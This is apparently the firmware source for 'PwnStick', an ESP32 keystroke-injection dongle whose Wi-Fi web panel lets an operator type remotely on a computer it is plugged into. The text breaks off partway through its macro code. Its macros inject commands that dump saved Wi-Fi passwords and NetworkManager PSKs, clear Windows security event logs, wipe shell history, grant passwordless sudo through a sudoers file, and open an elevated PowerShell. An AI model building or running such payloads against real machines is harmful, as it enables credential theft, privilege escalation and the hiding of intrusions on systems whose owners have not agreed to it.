#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include "HidDriver.h"
#include "UsbHidDriver.h"
#include "BleHidDriver.h"

// Standard HID key definitions to decouple from library-specific headers
#define KEY_LEFT_CTRL   0x80
#define KEY_LEFT_SHIFT  0x81
#define KEY_LEFT_ALT    0x82
#define KEY_LEFT_GUI    0x83
#define KEY_UP_ARROW    0xDA
#define KEY_DOWN_ARROW  0xD9
#define KEY_LEFT_ARROW  0xD8
#define KEY_RIGHT_ARROW 0xD7
#define KEY_BACKSPACE   0xB2
#define KEY_RETURN      0xB0
#define KEY_F11         0xCC
#define KEY_F2          0xC3
#define MOUSE_LEFT      1
#define MOUSE_RIGHT     2
#define MOUSE_MIDDLE    4

#include <FastLED.h>
#include "esp_lcd_panel_io.h"
#include "esp_lcd_panel_ops.h"
#include "esp_lcd_panel_vendor.h"
#include "esp_lcd_st7735.h"
#include <Fonts/glcdfont.c>
#include "qr_code.h"

#define LED_DI_PIN     40
#define NUM_LEDS       1
#define PIN_NUM_MOSI   3
#define PIN_NUM_CLK    5
#define PIN_NUM_CS     4
#define PIN_NUM_DC     2
#define PIN_NUM_RST    1
#define PIN_NUM_BCKL   38

#define C_GREEN      0x07E0
#define C_RED        0xF800
#define C_BLACK      0x0000
#define C_WHITE      0xFFFF

inline uint16_t SWAP(uint16_t v) { return (v >> 8) | (v << 8); }

CRGB leds[NUM_LEDS];
IHidDriver* activeDriver = nullptr;
UsbHidDriver usbDriver;
BleHidDriver bleDriver;
bool isBleMode = false;

void setHidMode(bool useBle) {
    isBleMode = useBle;
    activeDriver = useBle ? (IHidDriver*)&bleDriver : (IHidDriver*)&usbDriver;
}
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");
DNSServer dnsServer;

static esp_lcd_panel_handle_t panel_handle = NULL;
static esp_lcd_panel_io_handle_t io_handle = NULL;
static uint16_t screen_buf[160 * 80];
static uint16_t custom_img_buf[160 * 80];

static uint16_t* gif_storage[15];
static int gif_count = 0;
static int gif_idx = 0;
static unsigned long last_gif_ms = 0;
static bool gif_mode = false;

const char* ssid = "PwnStick";
String targetOS = "win";
String lastKey = "";
unsigned long lastKeyTime = 0;
bool show_img = false;
bool user_on_site = false;

int cursorX = 80, cursorY = 40;
int showCursorFrames = 0;

void setLastKey(String k) { lastKey = k; lastKeyTime = millis(); }

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<title>PwnStick v52</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<style>
* { user-select:none; -webkit-user-select:none; box-sizing:border-box; }
body { background:#000; color:#0f0; font-family:monospace; margin:0; text-align:center; height:100dvh; overflow:hidden; display:flex; flex-direction:column; }
.tabs { display:flex; border-bottom:1px solid #0f0; background:#0a0a0a; flex-shrink:0; }
.tab { flex:1; padding:12px; cursor:pointer; font-weight:bold; border-right:1px solid #111; }
.tab.active { background:#0f0; color:#000; }
.content { padding:8px; display:none; flex:1; overflow:hidden; flex-direction:column; gap:5px; min-height:0; }
.content.active { display:flex; }
button { background:#000; color:#0f0; border:1px solid #0f0; padding:10px; font-weight:bold; font-size:13px; border-radius:4px; transition:0.1s; flex:1; flex-shrink:0; }
button:active { background:#0f0; color:#000; }
button.toggled { background:#0f0 !important; color:#000 !important; box-shadow:0 0 10px #0f0; }
.row { display:flex; gap:5px; width:100%; flex-shrink:0; }
textarea { width:100%; height:45px; background:#111; color:#0f0; border:1px dashed #333; padding:8px; font-size:1.1em; outline:none; flex-shrink:0; user-select:auto; -webkit-user-select:auto; }
#pad-wrap { flex:1; display:flex; flex-direction:column; min-height:100px; }

.click-row { display:flex; height:50px; gap:2px; flex-shrink:0; }
.click-btn { flex:1; background:#080808; border:1px solid #333; border-top:none; border-radius:0 0 4px 4px; }
.click-btn:active { background:#111; border-color:#0f0; }
#crop-wrap { width:100%; max-width:600px; border:1px solid #333; margin:0 auto; background:#050505; position:relative; overflow:hidden; aspect-ratio:160/80; flex-shrink:1; }
#crop-canvas { display:block; width:100%; height:100%; background:#111; image-rendering:pixelated; cursor:move; }
.file-btn { position:relative; overflow:hidden; width:100%; flex-shrink:0; }
#img-f { position:absolute; left:0; top:0; opacity:0; width:100%; height:100%; cursor:pointer; }
.status { color:#888; font-size:11px; height:14px; flex-shrink:0; }
.opt-box { background:#111; border:1px solid #333; padding:8px; display:none; flex-direction:column; gap:4px; text-align:left; font-size:11px; flex-shrink:0; }
.opt-row { display:flex; justify-content:space-between; align-items:center; }
input[type=number] { background:#000; color:#0f0; border:1px solid #0f0; width:45px; padding:3px; }
#modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); display:none; flex-direction:column; padding:20px; z-index:100; }
.modal-header { display:flex; gap:10px; margin-bottom:20px; flex-shrink:0; }
.modal-body { flex:1; overflow-y:auto; display:grid; grid-template-columns:1fr 1fr; gap:10px; padding-bottom:20px; }
.modal-close { background:#333; color:#fff; border:none; padding:15px; border-radius:4px; margin-top:10px; flex-shrink:0; }
</style>
</head>
<body>
<div id="modal">
    <div class="modal-header">
        <button id="m-win-os" class="toggled" onclick="os='win';wsS('O:win');uM()">WIN</button>
        <button id="m-lin-os" onclick="os='lin';wsS('O:lin');uM()">LINUX</button>
        <button id="m-med-os" onclick="os='med';wsS('O:med');uM()">MEDIA</button>
    </div>
    <div id="m-list" class="modal-body"></div>
    <button class="modal-close" onclick="document.getElementById('modal').style.display='none'">CLOSE</button>
</div>
<div class="tabs"><div class="tab active" onclick="sT('ctl',this)">CONTROL Center</div><div class="tab" onclick="sT('ig',this)">IMAGE Beamer</div><div class="tab" style="flex:0.2; display:flex; align-items:center; justify-content:center;" onclick="sT('set',this)"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></div></div>
<div id="c-ctl" class="content active">
    <div class="row">
        <button id="mod-win" onmousedown="mD('win',this)" onmouseup="mU('win',this)">WIN</button>
        <button id="mod-ctrl" onmousedown="mD('ctrl',this)" onmouseup="mU('ctrl',this)">CTRL</button>
        <button id="mod-alt" onmousedown="mD('alt',this)" onmouseup="mU('alt',this)">ALT</button>
        <button id="mod-shift" onmousedown="mD('shift',this)" onmouseup="mU('shift',this)">SHIFT</button>
        <button onclick="oM()" style="background:#050;border-color:#0f0;color:#fff;flex:3">MACROS</button>
    </div>
    <textarea id="ta" placeholder="Type here..."></textarea>
    <div id="pad-wrap">
        <div id="pad" style="flex:1; background:#0a0a0a; border:1px solid #333; display:flex; align-items:center; justify-content:center; color:#222; border-radius:8px 8px 0 0; font-weight:bold; font-size:20px; touch-action:none;">TRACKPAD</div>
        <div class="click-row"><div class="click-btn" onmousedown="wsS('D:l')" onmouseup="wsS('U:l')" ontouchstart="wsS('D:l')" ontouchend="wsS('U:l')"></div><div class="click-btn" onmousedown="wsS('D:r')" onmouseup="wsS('U:r')" ontouchstart="wsS('D:r')" ontouchend="wsS('U:r')"></div></div>
    </div>
</div>
<div id="c-ig" class="content">
    <div class="file-btn"><button style="width:100%">SELECT IMAGE</button><input type="file" id="img-f" accept="image/*"></div>
    <div id="gif-opts" class="opt-box">
        <div class="opt-row"><span>Frames:</span><input type="number" id="g-cnt" value="5" min="1" max="15"></div>
        <div class="opt-row"><span>Skip:</span><input type="number" id="g-skp" value="1" min="0" max="10"></div>
    </div>
    <div id="status" class="status"></div>
    <div id="crop-wrap"><canvas id="crop-canvas" width="160" height="80"></canvas></div>
    <div id="ig-controls" style="display:none;margin-top:5px;flex-shrink:0">
        <div class="row"><button onclick="z(-0.02)">ZOOM -</button><button onclick="z(0.02)">ZOOM +</button><button onclick="rot()">ROT</button></div>
        <button id="b-up" onclick="upl()" style="width:100%;margin-top:5px;height:45px;font-size:16px">UPLOAD TO DONGLE</button>
    </div>
    <button onclick="wsS('I:clear')" style="margin-top:auto;border-color:#444;color:#666;flex-shrink:0">CLEAR SCREEN</button>
</div>
<div id="c-set" class="content">
    <div style="display:flex; align-items:center; justify-content:space-between; padding:10px; border-bottom:1px solid #333; flex-shrink:0;">
        <span>BLE Mode</span>
        <button id="tgl-ble" onclick="wsS('T:'+(this.classList.contains('toggled')?'usb':'ble')); this.classList.toggle('toggled'); this.innerText=this.classList.contains('toggled')?'ON':'OFF';" style="flex:none; width:80px; height:35px; background:#005; border-color:#00f; color:#fff;">OFF</button>
    </div>
    <div style="padding:10px; flex:1; overflow-y:auto;">
        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
            <span style="font-weight:bold;">Bonded Devices</span>
            <button onclick="wsS('B:list')" style="flex:none; width:60px; height:25px; padding:0; font-size:10px; background:#222; border-color:#555; color:#fff;">Refresh</button>
        </div>
        <div id="ble-list" style="display:flex; flex-direction:column; gap:5px;"></div>
    </div>
</div>
<script>
let ws=new WebSocket('ws://'+location.host+'/ws');
let os='win', isGif=false, gifBytes=null;
const mcs = {
    win: [
        {n:'Terminal', a:'term'}, {n:'Calculator', a:'calc'}, {n:'Rickroll', a:'rick'},
        {n:'Admin PS', a:'ps_admin'}, {n:'WiFi Pass', a:'wifi_pass'}, 
        {n:'Fake Update', a:'fake_upd'}, {n:'Notepad Ghost', a:'note_ghost'},
        {n:'Clear Logs', a:'win_clr'}, {n:'System Info', a:'win_info'}
    ],
    lin: [
        {n:'Terminal', a:'term'}, {n:'Calculator', a:'calc'}, {n:'SSH Snake', a:'snake'},
        {n:'Rickroll', a:'rick'}, {n:'Sys Recon', a:'lin_recon'}, 
        {n:'Net Info', a:'lin_net'}, {n:'WiFi Pass', a:'lin_wifi'},
        {n:'Fake Update', a:'fake_upd'}
    ],
    med: [
        {n:'Prev Song', a:'m_prev'}, {n:'Play/Pause', a:'m_pp'}, {n:'Next Song', a:'m_next'},
        {n:'Vol Down', a:'m_vdn'}, {n:'Mute', a:'m_mute'}, {n:'Vol Up', a:'m_vup'},
        {n:'Bright Down', a:'m_bdn'}, {n:'Bright Up', a:'m_bup'}, {n:'Media Stop', a:'m_stop'},
        {n:'Web Back', a:'m_back'}, {n:'Web Home', a:'m_home'}, {n:'Web Fwd', a:'m_fwd'},
        {n:'Browser', a:'m_web'}, {n:'Web Search', a:'m_srch'}, {n:'Bookmarks', a:'m_book'},
        {n:'Web Refresh', a:'m_refr'}, {n:'Calculator', a:'m_calc'}, {n:'Email', a:'m_mail'},
        {n:'Airplane', a:'m_air'}, {n:'Sleep', a:'m_sleep'}, {n:'Power', a:'m_power'},
        {n:'Screenshot', a:'m_scr'}
    ]};
function wsS(m){if(ws.readyState===1)ws.send(m);}
function sT(t,el){
document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
document.querySelectorAll('.content').forEach(x=>x.classList.remove('active'));
el.classList.add('active'); document.getElementById('c-'+t).classList.add('active');
}
function oM(){ document.getElementById('modal').style.display='flex'; uM(); }
function uM(){
    document.getElementById('m-win-os').className=(os=='win'?'toggled':'');
    document.getElementById('m-lin-os').className=(os=='lin'?'toggled':'');
    document.getElementById('m-med-os').className=(os=='med'?'toggled':'');
    let l=document.getElementById('m-list'); l.innerHTML='';
    l.style.gridTemplateColumns=(os=='med')?'1fr 1fr 1fr':'1fr 1fr';
    mcs[os].forEach(m=>{
        let b=document.createElement('button'); b.innerText=m.n; 
        b.onclick=()=>{ wsS('A:'+m.a); };
        l.appendChild(b);
    });
}
function mD(m,el){ el.dataset.h=setTimeout(()=>{ el.classList.toggle('toggled'); wsS('H:'+m+','+(el.classList.contains('toggled')?'1':'0')); el.dataset.h=0; },500); }
function mU(m,el){ if(el.dataset.h){ clearTimeout(el.dataset.h); wsS('P:'+m); el.dataset.h=0; } }
let ta=document.getElementById('ta');
ta.onkeydown=e=>{
    if(e.key.startsWith('Arrow')){ e.preventDefault(); wsS('A:'+e.key.toLowerCase()); return; }
    if(e.ctrlKey && e.key==='Backspace'){ e.preventDefault(); wsS('A:cb'); return; }
    if(e.key==='Enter'){ e.preventDefault(); wsS('E:1'); return; }
    if(e.key==='Backspace'){ e.preventDefault(); wsS('B:1'); return; }
};
ta.oninput=e=>{ if(e.inputType==='insertFromPaste'||ta.value.length>1){wsS('V:'+ta.value);ta.value='';}else{let c=ta.value.slice(-1);ta.value='';if(c)wsS('K:'+c);} };
// Trackpad - Fixed Relative Drag with Sensitivity + Multi-touch Right Click

ws.onmessage = e => {
    if(typeof e.data === 'string' && e.data.startsWith('B:')) {
        let devs = JSON.parse(e.data.substring(2));
        let bl = document.getElementById('ble-list');
        bl.innerHTML = '';
        devs.forEach(d => {
            let row = document.createElement('div');
            row.style.cssText = 'display:flex; flex-direction:column; background:#111; border:1px solid #333; padding:5px; border-radius:4px;';
            row.innerHTML = `<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
                <span style="color:#0f0; font-size:14px; word-break:break-all;">${d.name}</span>
                <span style="color:#888; font-size:10px;">${d.mac}</span>
            </div>
            <div style="display:flex; gap:5px;">
                <button onclick="wsS('B:conn:${d.mac}')" style="background:#030; border-color:#0f0; color:#0f0; padding:5px; font-size:11px;">Connect</button>
                <button onclick="let n=prompt('Rename:', '${d.name}'); if(n) wsS('B:ren:${d.mac}:'+n)" style="background:#330; border-color:#ff0; color:#ff0; padding:5px; font-size:11px;">Rename</button>
                <button onclick="if(confirm('Delete?')) wsS('B:del:${d.mac}')" style="background:#300; border-color:#f00; color:#f00; padding:5px; font-size:11px;">Del</button>
            </div>`;
            bl.appendChild(row);
        });
    }
};

// Trackpad - Two-Finger Scroll + Multi-touch Right Click
let p=document.getElementById('pad'),lX=0,lY=0,isD=false,tapT=0,maxT=0;
p.onmousedown=e=>{ isD=true; lX=e.clientX; lY=e.clientY; tapT=Date.now(); maxT=1; };
window.onmouseup=()=>{ if(isD && Date.now()-tapT<200) wsS(maxT===2?'C:r':'C:l'); isD=false; maxT=0; };
p.onmousemove=e=>{ if(isD){ let dx=e.clientX-lX, dy=e.clientY-lY; wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5)); lX=e.clientX; lY=e.clientY; } };
p.ontouchstart=e=>{ isD=true; lX=e.touches[0].clientX; lY=e.touches[0].clientY; tapT=Date.now(); maxT=Math.max(maxT, e.touches.length); };
p.ontouchend=e=>{ if(isD && Date.now()-tapT<200) wsS(maxT===2?'C:r':'C:l'); isD=false; maxT=0; };
p.ontouchmove=e=>{ 
    if(isD){ 
        maxT=Math.max(maxT, e.touches.length); 
        let dx=e.touches[0].clientX-lX, dy=e.touches[0].clientY-lY; 
        if (e.touches.length === 2) {
            // Two-finger scroll
            if(Math.abs(dy)>5){ wsS('W:'+(dy>0?-1:1)); lY=e.touches[0].clientY; }
        } else {
            // One-finger move
            wsS('M:'+Math.round(dx*2.5)+','+Math.round(dy*2.5)); 
            lX=e.touches[0].clientX; lY=e.touches[0].clientY; 
        }
    } 
    e.preventDefault(); 
};
// Image Editor
let scale=1,rotation=0,oX=0,oY=0,cvs=document.getElementById('crop-canvas'),ctx=cvs.getContext('2d'),curImg=new Image(),pD=0,cCvs=document.createElement('canvas'),cCtx=cCvs.getContext('2d');
document.getElementById('img-f').onchange=e=>{
    let f=e.target.files[0]; if(!f)return;
    isGif=(f.type==='image/gif');
    let r=new FileReader(); r.onload=ev=>{
        gifBytes=new Uint8Array(ev.target.result);
        curImg.onload=()=>{
            document.getElementById('ig-controls').style.display='block';
            document.getElementById('gif-opts').style.display=isGif?'flex':'none';
            scale=Math.max(160/curImg.width,80/curImg.height);oX=0;oY=0;rotation=0;drw(true);
        }; curImg.src=URL.createObjectURL(new Blob([gifBytes]));
    }; r.readAsArrayBuffer(f);
};
function drw(clr, imgOverride){
    if(clr){ ctx.fillStyle='#000'; ctx.fillRect(0,0,160,80); }
    let target = imgOverride || curImg;
    ctx.save(); ctx.translate(160/2+oX,80/2+oY); ctx.rotate(rotation*Math.PI/180);
    ctx.drawImage(target,-target.width*scale/2,-target.height*scale/2,target.width*scale,target.height*scale);
    ctx.restore();
}
function z(v){scale+=v;drw(true);} function rot(){rotation=(rotation+90)%360;drw(true);}
cvs.onmousedown=e=>{isD=true;lX=e.clientX;lY=e.clientY;};
cvs.onmousemove=e=>{if(isD){let r=160/cvs.offsetWidth;oX+=(e.clientX-lX)*r;oY+=(e.clientY-lY)*r;lX=e.clientX;lY=e.clientY;drw(true);}};
cvs.ontouchstart=e=>{if(e.touches.length===2)pD=Math.hypot(e.touches[0].pageX-e.touches[1].pageX,e.touches[0].pageY-e.touches[1].pageY);else{isD=true;lX=e.touches[0].clientX;lY=e.touches[0].clientY;}};
cvs.ontouchmove=e=>{let r=160/cvs.offsetWidth;if(e.touches.length===2){let d=Math.hypot(e.touches[0].pageX-e.touches[1].pageX,e.touches[0].pageY-e.touches[1].pageY);scale*=(d/pD);pD=d;drw(true);}else if(isD){oX+=(e.touches[0].clientX-lX)*r;oY+=(e.touches[0].clientY-lY)*r;lX=e.touches[0].clientX;lY=e.touches[0].clientY;drw(true);}e.preventDefault();};
async function upl(){
    let btn=document.getElementById('b-up'); btn.disabled=true;
    try{
        if(isGif){
            wsS('I:gif');
            let lw=gifBytes[6]|(gifBytes[7]<<8), lh=gifBytes[8]|(gifBytes[9]<<8);
            let hasGCT=(gifBytes[10]&0x80), gctSize=hasGCT?3*Math.pow(2,(gifBytes[10]&7)+1):0;
            let header=gifBytes.slice(0,13+gctSize);
            cCvs.width=lw; cCvs.height=lh; cCtx.clearRect(0,0,lw,lh);
            let frames=[], pos=13+gctSize, curF=[];
            while(pos<gifBytes.length && gifBytes[pos]!==0x3B && frames.length<50){
                let b=gifBytes[pos];
                if(b===0x21){ let st=pos; pos+=2; while(pos<gifBytes.length && gifBytes[pos]!==0) pos += gifBytes[pos]+1; pos++; if(gifBytes[st+1]===0xF9) curF.push(gifBytes.slice(st,pos)); }
                else if(b===0x2C){
                    let st=pos, x=gifBytes[pos+1]|(gifBytes[pos+2]<<8), y=gifBytes[pos+3]|(gifBytes[pos+4]<<8), w=gifBytes[pos+5]|(gifBytes[pos+6]<<8), h=gifBytes[pos+7]|(gifBytes[pos+8]<<8);
                    pos+=10; if(gifBytes[pos-1]&0x80) pos+=3*Math.pow(2,(gifBytes[pos-1]&7)+1); pos++;
                    while(pos<gifBytes.length && gifBytes[pos]!==0) pos += gifBytes[pos]+1; pos++;
                    curF.push(gifBytes.slice(st,pos));
                    let len=header.length+1; for(let c of curF) len+=c.length;
                    let f=new Uint8Array(len); f.set(header,0); let off=header.length;
                    for(let c of curF){ f.set(c,off); off+=c.length; } f[off]=0x3B;
                    frames.push({blob:URL.createObjectURL(new Blob([f],{type:'image/gif'})), x, y, w, h}); curF=[];
                } else pos++;
            }
            let maxF=parseInt(document.getElementById('g-cnt').value)||5, skip=parseInt(document.getElementById('g-skp').value)||0, sI=0;
            for(let i=0; i<frames.length && sI<maxF; i++){
                let f=frames[i];
                await new Promise(res=>{ let tmp=new Image(); tmp.onload=()=>{ cCtx.drawImage(tmp,f.x,f.y,f.w,f.h); if(i%(skip+1)===0){ drw(true,cCvs); let d=ctx.getImageData(0,0,160,80).data,b=new Uint8Array(25600); for(let j=0;j<12800;j++){ let r=d[j*4],g=d[j*4+1],bl=d[j*4+2]; let rgb=((r&0xF8)<<8)|((g&0xFC)<<3)|(bl>>3); b[j*2]=rgb>>8;b[j*2+1]=rgb&0xFF; } ws.send(b); sI++; document.getElementById('status').innerText='Sending '+sI+'/'+maxF; } res(); }; tmp.src=f.blob; });
                if(i%(skip+1)===0) await new Promise(r=>setTimeout(r,400));
            }
            document.getElementById('status').innerText='Animated!'; drw(true);
        }else{
            wsS('I:img'); let d=ctx.getImageData(0,0,160,80).data,b=new Uint8Array(25600); for(let j=0;j<12800;j++){ let r=d[j*4],g=d[j*4+1],bl=d[j*4+2]; let rgb=((r&0xF8)<<8)|((g&0xFC)<<3)|(bl>>3); b[j*2]=rgb>>8;b[j*2+1]=rgb&0xFF; } ws.send(b); document.getElementById('status').innerText='Success!';
        }
    }catch(e){console.error(e);}
    btn.disabled=false;
}
ws.onopen=()=>wsS('U:1');
</script>
</body>
</html>
)rawliteral";

static uint32_t binaryOffset = 0;

void drawChar(int x, int y, char c, uint16_t color, int scale) {
    if (c < 0 || c > 255) return;
    for (int i = 0; i < 5; i++) {
        uint8_t line = pgm_read_byte(&font[c * 5 + i]);
        for (int j = 0; j < 8; j++) {
            if (line & 0x1) {
                for (int sx = 0; sx < scale; sx++) {
                    for (int sy = 0; sy < scale; sy++) {
                        int px = x + i * scale + sx; int py = y + j * scale + sy;
                        if (px >= 0 && px < 160 && py >= 0 && py < 80) screen_buf[py * 160 + px] = SWAP(color);
                    }
                }
            }
            line >>= 1;
        }
    }
}

void drawString(int x, int y, const char* str, uint16_t color, int scale) {
    while (*str) { drawChar(x, y, *str, color, scale); x += 6 * scale; str++; }
}

void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
    AwsFrameInfo *info = (AwsFrameInfo*)arg;
    if (info->opcode == WS_TEXT && info->final && info->index == 0 && info->len == len) {
        data[len] = 0; String msg = (char*)data;
        if (msg.startsWith("K:")) { activeDriver->print(msg.substring(2)); setLastKey(msg.substring(2)); }
        else if (msg.startsWith("V:")) { activeDriver->print(msg.substring(2)); setLastKey("PASTE"); }
        else if (msg.startsWith("E:")) { activeDriver->write(KEY_RETURN); setLastKey("ENT"); }
        else if (msg.startsWith("B:1")) { activeDriver->write(KEY_BACKSPACE); setLastKey("DEL"); }
        else if (msg.startsWith("M:")) {
            int comma = msg.indexOf(',');
            if (comma > 0) {
                int x = msg.substring(2, comma).toInt(); int y = msg.substring(comma+1).toInt();
                activeDriver->mouseMove(x, y); cursorX += x; cursorY += y;
                if(cursorX < 0) cursorX = 0; if(cursorX > 156) cursorX = 156;
                if(cursorY < 0) cursorY = 0; if(cursorY > 76) cursorY = 76;
                showCursorFrames = 10;
            }
        } else if (msg.startsWith("D:") || msg.startsWith("C:")) {
            char b = msg.charAt(2); uint8_t btn = (b=='r')?MOUSE_RIGHT:(b=='m')?MOUSE_MIDDLE:MOUSE_LEFT;
            if (msg.startsWith("C:")) activeDriver->mouseClick(btn); else activeDriver->mousePress(btn);
        } else if (msg.startsWith("U:")) {
            if(msg.charAt(2) == '1') { user_on_site = true; }
            else { char b = msg.charAt(2); uint8_t btn = (b=='r')?MOUSE_RIGHT:(b=='m')?MOUSE_MIDDLE:MOUSE_LEFT; activeDriver->mouseRelease(btn); }
        } else if (msg.startsWith("H:")) {
            int comma = msg.indexOf(','); String mod = msg.substring(2, comma); bool st = msg.substring(comma+1)=="1";
            uint8_t k = (mod=="win")?KEY_LEFT_GUI:(mod=="ctrl")?KEY_LEFT_CTRL:(mod=="alt")?KEY_LEFT_ALT:KEY_LEFT_SHIFT;
            if(st) activeDriver->press(k); else { activeDriver->release(k); delay(10); activeDriver->write(0); }
        } else if (msg.startsWith("P:")) {
            String mod = msg.substring(2); uint8_t k = (mod=="win")?KEY_LEFT_GUI:(mod=="ctrl")?KEY_LEFT_CTRL:(mod=="alt")?KEY_LEFT_ALT:KEY_LEFT_SHIFT;
            activeDriver->press(k); delay(100); activeDriver->release(k); setLastKey(mod);
        } else if (msg.startsWith("A:")) { 
            String act = msg.substring(2); activeDriver->releaseAll();
            bool sp = (targetOS == "lin");
            if(act=="arrowup") activeDriver->write(KEY_UP_ARROW);
            else if(act=="arrowdown") activeDriver->write(KEY_DOWN_ARROW);
            else if(act=="arrowleft") activeDriver->write(KEY_LEFT_ARROW);
            else if(act=="arrowright") activeDriver->write(KEY_RIGHT_ARROW);
            else if(act=="cb") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_BACKSPACE); delay(50); activeDriver->releaseAll(); }
            else if(act=="ps_admin") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('x'); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->print("a"); delay(1000); activeDriver->press(KEY_LEFT_ALT); activeDriver->print("y"); activeDriver->releaseAll(); }
            else if(act=="wifi_pass") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("cmd"); delay(1000); activeDriver->println("netsh wlan show profiles * key=clear | findstr /C:\"Key Content\" /C:\"SSID name\""); }
            else if(act=="fake_upd") {
                if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("https://fakeupdate.net/win10ue/"); delay(1500); activeDriver->write(KEY_F11); }
                else { activeDriver->press(KEY_LEFT_ALT); activeDriver->press(KEY_F2); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->print("xdg-open 'https://fakeupdate.net/steam/'"); delay(50); activeDriver->write(KEY_RETURN); delay(1500); activeDriver->write(KEY_F11); }
            }
            else if(act=="note_ghost") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("notepad"); delay(1000); activeDriver->println("I am watching you..."); }
            else if(act=="win_clr") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("powershell -NoP -Command \"Clear-EventLog -LogName System,Application,Security\""); }
            else if(act=="win_info") { activeDriver->press(KEY_LEFT_GUI); activeDriver->print("r"); delay(200); activeDriver->releaseAll(); delay(500); activeDriver->println("cmd /k systeminfo"); }
            else if(act=="lin_recon") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("hostnamectl; timedatectl; lsusb; lscpu; ip a"); }
            else if(act=="lin_net") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("ip addr; nmcli device wifi list"); }
            else if(act=="lin_ls") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("history -c && history -w && exit"); }
            else if(act=="lin_sudo") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("echo \"$USER ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/99-pwn"); }
            else if(act=="lin_wifi") { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(500); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->println("sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"); }
            else if(act=="term") { if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('r'); delay(300); activeDriver->releaseAll(); delay(800); activeDriver->println("cmd"); } else { activeDriver->press(KEY_LEFT_CTRL); activeDriver->press(KEY_LEFT_ALT); activeDriver->press('t'); delay(300); activeDriver->releaseAll(); } }
            else if(act=="calc") { if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('r'); delay(300); activeDriver->releaseAll(); delay(800); activeDriver->println("calc"); } else { activeDriver->press(KEY_LEFT_ALT); activeDriver->press(KEY_F2); delay(500); activeDriver->releaseAll(); delay(1000); if(sp) activeDriver->print(" "); activeDriver->print("gnome-calculator"); delay(100); activeDriver->write(KEY_RETURN); } }
            else if(act=="rick") { if(targetOS=="win") { activeDriver->press(KEY_LEFT_GUI); activeDriver->press('r'); delay(300); activeDriver->releaseAll(); delay(800); activeDriver->println("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); } else { activeDriver->press(KEY_LEFT_ALT); activeDriver->press(KEY_F2); delay(300); activeDriver->releaseAll(); delay(800); if(sp) activeDriver->print(" "); activeDriver->print("xdg-open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"); delay(50); activeDriver->write(KEY_RETURN); } }
